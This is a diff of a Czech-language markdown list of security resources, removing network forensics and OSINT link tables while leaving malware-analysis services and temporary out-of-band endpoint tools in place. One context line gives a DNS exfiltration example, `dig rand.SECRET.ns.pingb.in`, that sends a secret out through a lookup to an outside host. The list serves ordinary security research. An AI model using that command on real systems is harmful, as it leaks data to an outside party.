@@ -112,14 +112,6 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš jen sp
 | [VMRay](https://www.vmray.com)           | dynamická analýza malwaru, placená služba |
 | [Hybrid Analysis](https://hybrid-analysis.com/) | dynamická analýza malwaru          |
 
-## Network Forensics
-
-| název                                    | popis                                    |
-| ---------------------------------------- | ---------------------------------------- |
-| [malware-traffic-analysis.net](https://www.malware-traffic-analysis.net) | IOCs, síťové záchyty, apod. |
-| [PacketTotal](https://packettotal.com/)  | pcap analýza, docela pomalé GUI          |
-| [A-Packets](https://apackets.com/)       | pcap analýza, graf sítě, export HTTP     |
-
 ## Temporary domény, url, emaily, OOB servery
 
 | název                                   | popis                                                             |
@@ -127,16 +119,6 @@ Kromě odkazů sem budu přidávat i vlastní poznámky, ale to nejspíš jen sp
 | [webhook.site](https://webhook.site/)   | asi nejlepší možnost, až 500 requestů                             |
 | [pingb.in](http://pingb.in)             | data exiltration pomocí DNS lookup: `dig rand.SECRET.ns.pingb.in` |
 | [RequestBin.net](http://requestbin.net) | veřejné URL, ukazuje HTTP hlavičky, POST parametry, GET parametry |
-
-## OSINT - Open-source intelligence
-
-| název                                               | popis              |
-| --------------------------------------------------- | ------------------ |
-| [passivedns](https://passivedns.mnemonic.no/)       | Passive DNS        |
-| [macvendorlookup](https://www.macvendorlookup.com/) | MAC Lookup         | 
-| [macvendors](https://macvendors.com/)               | MAC Lookup         |
-| [NERD CESNET](https://nerd.cesnet.cz/nerd/ips/)     | reputační databáze |
-| [AbuseIPDB](https://www.abuseipdb.com)              | reputační databáze |
 
 ## Blogy
 
